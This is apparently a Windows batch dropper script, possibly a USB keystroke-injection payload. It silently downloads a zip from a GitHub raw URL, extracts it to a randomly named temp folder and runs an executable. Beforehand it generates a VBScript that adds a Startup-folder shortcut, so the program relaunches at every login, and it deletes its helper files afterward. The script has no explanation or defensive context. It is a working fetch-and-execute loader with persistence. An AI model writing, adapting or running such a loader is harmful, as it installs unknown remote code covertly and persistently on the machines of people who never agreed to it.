@echo off
set "URL=https://raw.githubusercontent.com/BLOCKCE/ducky/refs/heads/main/dg.zip"
set "EXE=hsapps.exe"
set "DIR=%TEMP%\awdiojawdoij"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "shortcutName=aagagwwjjw.lnk"
set "vbsFile=%TEMP%\adwduhhu2.vbs"

rmdir /s /q "%DIR%" 2>nul & mkdir "%DIR%"

if exist "%startupFolder%\%shortcutName%" del /q /f "%startupFolder%\%shortcutName%"

(
echo Set oWS = WScript.CreateObject^("WScript.Shell"^)
echo sLinkFile = "%startupFolder%\%shortcutName%"
echo Set oLink = oWS.CreateShortcut^(sLinkFile^)
echo oLink.TargetPath = "%DIR%\%EXE%"
echo oLink.WorkingDirectory = "%DIR%"
echo oLink.Save
) > "%vbsFile%"

start "" /wait wscript.exe "%vbsFile%"
del "%vbsFile%"

curl -Ls "%URL%" -o "%TEMP%\pkg.zip" && tar -xf "%TEMP%\pkg.zip" -C "%DIR%" && del /q "%TEMP%\pkg.zip" && start "" "%DIR%\%EXE%"
